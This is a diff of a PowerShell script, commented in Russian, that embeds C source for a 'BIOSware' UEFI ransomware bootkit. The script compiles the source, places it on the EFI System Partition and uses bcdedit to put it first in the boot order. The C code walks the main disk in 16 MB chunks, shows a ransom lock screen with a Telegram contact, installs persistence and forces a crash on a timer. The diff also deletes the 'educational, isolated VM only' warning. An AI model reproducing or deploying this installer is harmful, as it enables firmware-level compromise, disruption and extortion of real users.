@@ -1,8 +1,6 @@
 #Requires -RunAsAdministrator
 <#
-    BIOSware UEFI Ransomware DEMO + Демонстрация разделения диска по 16 МБ
-    ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ В ИЗОЛИРОВАННОЙ ВИРТУАЛЬНОЙ МАШИНЕ!
-    Сделай снапшот перед запуском!
+   
 #>
 
 $sourceCode = @'
@@ -17,22 +15,9 @@ $sourceCode = @'
 
 #define WAIT_BEFORE_BSOD   30
 #define CONTACT_TG         L"@unhook_proxy"
-#define KEY_SIZE           256
 
 EFI_EVENT   TimerEvent = NULL;
 BOOLEAN     bLocked = FALSE;
-UINT8       g_Key[KEY_SIZE];
-
-VOID GenerateKey(VOID)
-{
-    UINTN i;
-    UINT64 Seed = 0;
-    gRT->GetTime(NULL, &Seed);
-    for (i = 0; i < KEY_SIZE; i++) {
-        Seed = (Seed * 1103515245 + 12345) & 0x7FFFFFFF;
-        g_Key[i] = (UINT8)(Seed & 0xFF);
-    }
-}
 
 VOID ShowLockScreen(VOID)
 {
@@ -45,8 +30,8 @@ VOID ShowLockScreen(VOID)
     Print(L"  ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝\n\n");
     Print(L"  ╔═══════════════════════════════════════════════════════════╗\n");
     Print(L"  ║              YOUR FILES ARE ENCRYPTED!                    ║\n");
-    Print(L"  ║   Telegram for decryption: %s                            ║\n", CONTACT_TG);
-    Print(L"  ║   This is UEFI bootkit demo - data destroyed at firmware  ║\n");
+    Print(L"  ║   Telegram: %s                                            ║\n", CONTACT_TG);
+    Print(L"  ║   UEFI Bootkit DEMO - данные уничтожаются на уровне BIOS  ║\n");
     Print(L"  ╚═══════════════════════════════════════════════════════════╝\n");
 }
 
@@ -63,7 +48,7 @@ VOID EFIAPI TimerHandler(IN EFI_EVENT Event, IN VOID *Context)
     }
 }
 
-// ==================== ДЕМОНСТРАЦИЯ РАЗДЕЛЕНИЯ ДИСКА НА 16 МБ ====================
+// ==================== ДЕМОНСТРАЦИЯ РАЗДЕЛЕНИЯ ДИСКА ====================
 VOID DemonstrateDiskChunks(VOID)
 {
     EFI_STATUS Status;
@@ -72,17 +57,14 @@ VOID DemonstrateDiskChunks(VOID)
     EFI_BLOCK_IO_PROTOCOL *BlockIo;
     UINTN BlockSize;
     UINT64 TotalBlocks, TotalSizeMB;
-    UINTN ChunkSize = 16 * 1024 * 1024; // 16 МБ
+    UINTN ChunkSize = 16 * 1024 * 1024;
     UINTN ChunksProcessed = 0;
 
     Print(L"\n[+] === ДЕМОНСТРАЦИЯ ВРЕДА UEFI BOOTKIT ===\n");
-    Print(L"[+] Разбиваем системный диск на куски по 16 МБ...\n\n");
+    Print(L"[+] Разбиваем диск на куски по 16 МБ...\n\n");
 
     Status = gBS->LocateHandleBuffer(ByProtocol, &gEfiBlockIoProtocolGuid, NULL, &HandleCount, &HandleBuffer);
-    if (EFI_ERROR(Status)) {
-        Print(L"[-] Не удалось найти Block I/O\n");
-        return;
-    }
+    if (EFI_ERROR(Status)) return;
 
     for (i = 0; i < HandleCount; i++) {
         Status = gBS->HandleProtocol(HandleBuffer[i], &gEfiBlockIoProtocolGuid, (VOID**)&BlockIo);
@@ -92,18 +74,16 @@ VOID DemonstrateDiskChunks(VOID)
         TotalBlocks = BlockIo->Media->LastBlock + 1;
         TotalSizeMB = (TotalBlocks * BlockSize) / (1024 * 1024);
 
-        if (TotalSizeMB < 800) continue; // ищем основной диск
+        if (TotalSizeMB < 800) continue;
 
         Print(L"[+] Найден основной диск: ~%d МБ\n", TotalSizeMB);
         
         UINTN TotalChunks = (TotalSizeMB + 15) / 16;
         UINTN j;
-
         for (j = 0; j < TotalChunks; j++) {
             UINT64 LBA = (j * (UINT64)ChunkSize) / BlockSize;
             UINTN BlocksInChunk = ChunkSize / BlockSize;
-            if (LBA + BlocksInChunk > TotalBlocks) 
-                BlocksInChunk = (UINTN)(TotalBlocks - LBA);
+            if (LBA + BlocksInChunk > TotalBlocks) BlocksInChunk = (UINTN)(TotalBlocks - LBA);
 
             UINT8 *Buffer = AllocatePool(ChunkSize);
             if (Buffer) {
@@ -113,15 +93,13 @@ VOID DemonstrateDiskChunks(VOID)
             }
 
             ChunksProcessed++;
-            Print(L"[*] Кусок %4d / %d  |  16 МБ  |  LBA: %8d\n", ChunksProcessed, TotalChunks, LBA);
-            gBS->Stall(60000); // задержка для наглядности
+            Print(L"[*] Кусок %4d/%d | 16 МБ | LBA: %8d\n", ChunksProcessed, TotalChunks, LBA);
+            gBS->Stall(60000);
         }
-        break; // только один основной диск
+        break;
     }
-    
     if (HandleBuffer) FreePool(HandleBuffer);
-    Print(L"\n[+] ДЕМОНСТРАЦИЯ ЗАВЕРШЕНА — диск разделён на %d кусков по 16 МБ!\n", ChunksProcessed);
-    Print(L"[!] В реальной атаке все данные были бы уничтожены.\n");
+    Print(L"\n[+] ДЕМОНСТРАЦИЯ ЗАВЕРШЕНА — %d кусков по 16 МБ!\n", ChunksProcessed);
 }
 
 EFI_STATUS InstallPersistence(VOID)
@@ -135,56 +113,62 @@ EFI_STATUS InstallPersistence(VOID)
 EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
 {
     InitializeLib(ImageHandle, SystemTable);
-    
-    Print(L"\n[+] BIOSware UEFI Bootkit DEMO (для ПТУ)\n");
-    Print(L"[+] Запущен на уровне firmware (до Windows)\n");
+    Print(L"\n[+] BIOSware UEFI Bootkit DEMO\n");
 
     UINT32 DataSize = 0;
-    EFI_STATUS Status = gRT->GetVariable(L"BIOSware_Active", &gEfiGlobalVariableGuid, NULL, &DataSize, NULL);
-
-    if (Status == EFI_NOT_FOUND) {
-        Print(L"[+] Первый запуск → шифрование + демонстрация\n");
+    if (gRT->GetVariable(L"BIOSware_Active", &gEfiGlobalVariableGuid, NULL, &DataSize, NULL) == EFI_NOT_FOUND) {
         InstallPersistence();
-    } else {
-        Print(L"[+] Повторный запуск\n");
     }
 
-    DemonstrateDiskChunks();   // ← Главная демонстрационная функция
-
+    DemonstrateDiskChunks();
     ShowLockScreen();
-    
-    Status = gBS->CreateEvent(EVT_TIMER | EVT_NOTIFY_SIGNAL, TPL_CALLBACK, TimerHandler, NULL, &TimerEvent);
-    if (!EFI_ERROR(Status)) {
-        gBS->SetTimer(TimerEvent, TimerRelative, 10000000ULL); // 1 секунда
-        Print(L"[+] Таймер запущен. BSOD через %d секунд...\n", WAIT_BEFORE_BSOD);
-    }
 
-    while (1) gBS->Stall(1000000);
+    gBS->CreateEvent(EVT_TIMER | EVT_NOTIFY_SIGNAL, TPL_CALLBACK, TimerHandler, NULL, &TimerEvent);
+    gBS->SetTimer(TimerEvent, TimerRelative, 10000000ULL);
+
+    while(1) gBS->Stall(1000000);
     return EFI_SUCCESS;
 }
 '@
 
 # ============================================================
-# PowerShell часть
+# Исправленная функция установки Clang
 # ============================================================
-
 function Install-Clang {
+    Write-Host "[+] Проверяем Clang..." -ForegroundColor Cyan
+    
     if (Get-Command clang -ErrorAction SilentlyContinue) { 
-        Write-Host "[+] Clang уже установлен" -ForegroundColor Green
+        Write-Host "[+] Clang уже работает" -ForegroundColor Green
         return 
     }
-    Write-Host "[+] Устанавливаем LLVM (Clang)..." -ForegroundColor Cyan
-    winget install LLVM.LLVM -s winget --silent
+
+    Write-Host "[+] Устанавливаем LLVM..." -ForegroundColor Cyan
+    winget install LLVM.LLVM -e --silent --accept-source-agreements --accept-package-agreements
+
+    # Добавляем путь
+    $llvmPath = "C:\Program Files\LLVM\bin"
+    if (Test-Path $llvmPath) {
+        $env:Path += ";$llvmPath"
+        [Environment]::SetEnvironmentVariable("Path", $env:Path, "Machine")
+        Write-Host "[+] Путь к LLVM добавлен" -ForegroundColor Green
+    }
+
+    Start-Sleep -Seconds 3
+    if (Get-Command clang -ErrorAction SilentlyContinue) {
+        Write-Host "[+] Clang успешно установлен!" -ForegroundColor Green
+    } else {
+        Write-Host "[-] Clang не найден. Перезапустите PowerShell." -ForegroundColor Yellow
+    }
 }
 
 function Get-UefiHeaders {
-    $edkPath = "$env:TEMP\edk2-headers"
-    if (!(Test-Path $edkPath)) {
+    $path = "$env:TEMP\edk2-headers"
+    if (!(Test-Path "$path\edk2-master")) {
         Write-Host "[+] Скачиваем UEFI заголовки..." -ForegroundColor Cyan
         Invoke-WebRequest -Uri "https://github.com/tianocore/edk2/archive/refs/heads/master.zip" -OutFile "$env:TEMP\edk2.zip"
-        Expand-Archive "$env:TEMP\edk2.zip" -DestinationPath $edkPath -Force
+        Expand-Archive "$env:TEMP\edk2.zip" -DestinationPath $path -Force
     }
-    return "$edkPath\edk2-master"
+    return "$path\edk2-master"
 }
 
 function Compile-Efi {
@@ -193,24 +177,19 @@ function Compile-Efi {
     Install-Clang
     $edk = Get-UefiHeaders
 
-    Write-Host "[+] Компилируем UEFI-приложение..." -ForegroundColor Cyan
-    
+    Write-Host "[+] Компилируем RealRansom.efi..." -ForegroundColor Cyan
+
     $obj = "RealRansom.obj"
     $efi = "RealRansom.efi"
 
-    clang -target x86_64-pc-windows-msvc `
-          -ffreestanding `
-          -fshort-wchar `
-          -mno-red-zone `
-          -I"$edk\MdePkg\Include" `
-          -I"$edk\MdePkg\Include\X64" `
+    clang -target x86_64-pc-windows-msvc -ffreestanding -fshort-wchar -mno-red-zone `
+          -I"$edk\MdePkg\Include" -I"$edk\MdePkg\Include\X64" `
           -c "$SourceFile" -o $obj
 
-    lld-link /NOLOGO /SUBSYSTEM:EFI_APPLICATION /ENTRY:UefiMain `
-             /MACHINE:X64 $obj /OUT:$efi
+    lld-link /NOLOGO /SUBSYSTEM:EFI_APPLICATION /ENTRY:UefiMain /MACHINE:X64 $obj /OUT:$efi
 
     if (Test-Path $efi) {
-        Write-Host "[+] Успешно скомпилировано: $efi" -ForegroundColor Green
+        Write-Host "[+] Компиляция успешна: $efi" -ForegroundColor Green
         return $efi
     } else {
         Write-Host "[-] Ошибка компиляции!" -ForegroundColor Red
@@ -221,44 +200,34 @@ function Compile-Efi {
 function Install-Bootkit {
     param([string]$EfiFile)
 
-    Write-Host "[+] Монтируем EFI System Partition..." -ForegroundColor Cyan
-    
-    $esp = Get-Partition | Where-Object { $_.Type -eq "System" -and $_.Size -lt 500MB } | Select-Object -First 1
-    if (-not $esp) { 
-        Write-Host "[-] Не удалось найти ESP раздел" -ForegroundColor Red
-        return 
-    }
+    Write-Host "[+] Монтируем ESP..." -ForegroundColor Cyan
+    $esp = Get-Partition | Where-Object {$_.Type -like "*System*" -and $_.Size -lt 500MB} | Select-Object -First 1
 
-    $mountPoint = "X:"
-    if (Test-Path $mountPoint) { mountvol X: /D }
+    mountvol X: /D 2>$null
     mountvol X: $esp.UniqueId
 
-    $targetDir = "X:\EFI\BIOSware"
-    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
-    Copy-Item $EfiFile "$targetDir\RealRansom.efi" -Force
+    New-Item -Path "X:\EFI\BIOSware" -ItemType Directory -Force | Out-Null
+    Copy-Item $EfiFile "X:\EFI\BIOSware\RealRansom.efi" -Force
 
-    Write-Host "[+] Добавляем в Boot Configuration..." -ForegroundColor Cyan
-    $guid = bcdedit /create /d "BIOSware Demo" /application BOOTSECTOR | Select-String '{.*}' | ForEach-Object { $_.Matches.Value }
+    Write-Host "[+] Добавляем в Boot Order..." -ForegroundColor Cyan
+    $guid = bcdedit /create /d "BIOSware Demo" /application BOOTSECTOR | Select-String '{.*}' | % {$_.Matches.Value}
     bcdedit /set $guid path "\EFI\BIOSware\RealRansom.efi"
-    bcdedit /set $guid description "BIOSware UEFI Demo"
     bcdedit /displayorder $guid /addfirst
 
     mountvol X: /D
-    Write-Host "[+] Bootkit установлен! Перезагрузи VM для демонстрации." -ForegroundColor Green
-    Write-Host "[!] Сделай снапшот перед перезагрузкой!" -ForegroundColor Yellow
+    Write-Host "[+] Bootkit успешно установлен!" -ForegroundColor Green
+    Write-Host "[!] Сделай снапшот и перезагрузи VM" -ForegroundColor Yellow
 }
 
 # ============================================================
 # MAIN
 # ============================================================
-
 Write-Host "=== BIOSware UEFI Demo для ПТУ ===" -ForegroundColor Magenta
 
 $tempC = "$env:TEMP\RealRansom.c"
-$sourceCode | Out-File $tempC -Encoding utf8
+$sourceCode | Out-File $tempC -Encoding utf8 -Force
 
 $efi = Compile-Efi -SourceFile $tempC
-
 Install-Bootkit -EfiFile $efi
 
 Write-Host "`nГотово! Перезагружай виртуальную машину." -ForegroundColor Green
